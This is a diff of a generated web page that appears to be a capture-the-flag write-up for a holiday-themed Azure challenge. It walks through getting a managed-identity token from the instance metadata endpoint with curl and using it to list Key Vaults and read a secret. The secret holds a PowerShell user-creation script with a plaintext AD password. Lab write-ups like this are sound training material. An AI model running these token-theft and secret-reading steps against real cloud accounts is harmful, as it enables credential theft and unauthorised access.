@@ -18,7 +18,7 @@
       
       
       <link rel="icon" href="../../img/misc/favicon.ico">
-      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.2">
     
     
       
@@ -1247,7 +1247,7 @@
         
   
   <span class="md-ellipsis">
-    easter_eggs
+    Easter Eggs
   </span>
   
 
@@ -1325,13 +1325,18 @@ drwxr-xr-x 6 alabaster alabaster 4096 Nov  9 14:07 .venv
 drwxr-xr-x 2 alabaster alabaster 4096 Nov  9 14:07 impacket
 </code></pre></div>
 <p>subscrptionid: 2b0942f3-9bca-484b-a508-abdae2db5e64</p>
-<p>```https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2021-04-01 | jq
-<div class="highlight"><pre><span></span><code>```bash linenums=&quot;1&quot; hl_lines=&quot;7&quot; title=&quot;Just code&quot;
-curl -X GET -H &quot;Authorization: Bearer 
-&lt;Access_Token_base64&gt;
-&quot; 
-&quot;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2021-04-01&quot; | jq 
-</code></pre></div></p>
+<div class="highlight"><pre><span></span><code>https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2021-04-01 | jq
+</code></pre></div>
+<p>Use the folloinwg REST API to retrieve the vaults information: </p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Just code</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span>
+<span class="s2">&lt;Access_Token_base64&gt;</span>
+<span class="s2">&quot;</span><span class="w"> </span>
+<span class="s2">&quot;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2021-04-01&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>
+</code></pre></div></td></tr></table></div>
+<p>The <code>&lt;Access_Token_base64&gt;</code> should be your access token from Certificate SSHenanigans challenge. </p>
 <p>Return value: 
 <div class="highlight"><pre><span></span><code>{
   &quot;value&quot;: [
@@ -1352,7 +1357,7 @@ curl -X GET -H &quot;Authorization: Bearer
   ]
 }
 </code></pre></div></p>
-<p>We then use Resources – Get to enumerate: </p>
+<p>We get two vaults. We then use Resources - Get to enumerate the vaults: </p>
 <p><code>"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv?api-version=2023-02-01" | jq</code></p>
 <p>Return value: 
 <div class="highlight"><pre><span></span><code>{
@@ -1415,7 +1420,7 @@ curl -X GET -H &quot;Authorization: Bearer
 </code></pre></div></p>
 <h3 id="get-the-new-access-token">Get the new access token:<a class="headerlink" href="#get-the-new-access-token" title="Permanent link">⚓︎</a></h3>
 <p><code>curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://vault.azure.net' -H Metadata:true -s | jq</code></p>
-<p>We need to record the base64 access token returned to us. </p>
+<p>We need to record the base64 access token returned to us. It should be in json format after <code>"access_token":</code></p>
 <h3 id="key-valut-password">KEY VALUT password:<a class="headerlink" href="#key-valut-password" title="Permanent link">⚓︎</a></h3>
 <p>Request a new Token: </p>
 <p><code>curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s | jq</code></p>
@@ -1423,13 +1428,13 @@ curl -X GET -H &quot;Authorization: Bearer
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Just code</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer &lt;New_Token&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv/privateEndpointConnections?api-version=2022-07-01&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
 </code></pre></div></td></tr></table></div>
 <h3 id="get-the-secret-name">Get the secret name:<a class="headerlink" href="#get-the-secret-name" title="Permanent link">⚓︎</a></h3>
+<p>Use <code>curl -X GET -H "Authorization: Bearer &lt;New_Token&gt;"</code> followed by the URL below:</p>
 <p>"https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4" | jq</p>
 <p>"https://northpole-it-kv.vault.azure.net/certificates/issuers?api-version=7.4" | jq</p>
 <p>"https://northpole-it-kv.vault.azure.net/certificates?api-version=7.4" | jq</p>
 <h3 id="get-the-secret-content-by-its-name">Get the secret content by its name:<a class="headerlink" href="#get-the-secret-content-by-its-name" title="Permanent link">⚓︎</a></h3>
-<p><code>"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4" | jq</code></p>
-<p>We can use the syntax 
-<code>curl -X GET -H "Authorization: Bearer &lt;New_Token&gt;"</code> followed by above commands to request those resources!!!</p>
+<p><code>curl -X GET -H "Authorization: Bearer &lt;New_Token&gt;" "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4" | jq</code></p>
+<p>We can use above commands to request those resources below: </p>
 <div class="highlight"><pre><span></span><code>{
   &quot;value&quot;: &quot;Import-Module ActiveDirectory; $UserName = \&quot;elfy\&quot;; $UserDomain = \&quot;northpole.local\&quot;; $UserUPN = \&quot;$UserName@$UserDomain\&quot;; $Password = ConvertTo-SecureString \&quot;J4`ufC49/J4766\&quot; -AsPlainText -Force; $DCIP = \&quot;10.0.0.53\&quot;; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \&quot;\&quot; -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru&quot;,
   &quot;id&quot;: &quot;https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d&quot;,
@@ -1532,7 +1537,6 @@ And he&#39;ll silently take his way.
 a Christmas meal: </p>
 <p><img alt="Secret recipe" src="../../img/objectives/o19/cookies.png" /></p>
 <h4 id="the-method-is-base64-encoding-and-decoding">The method is base64 encoding and decoding!<a class="headerlink" href="#the-method-is-base64-encoding-and-decoding" title="Permanent link">⚓︎</a></h4>
-<p><img alt="Terminal output" src="../../img/objectives/o19/system.png" /></p>
 <div class="admonition success">
 <p class="admonition-title">Answer</p>
 <p>The secret file is: InstructionsForEnteringSatelliteGroundStation.txt
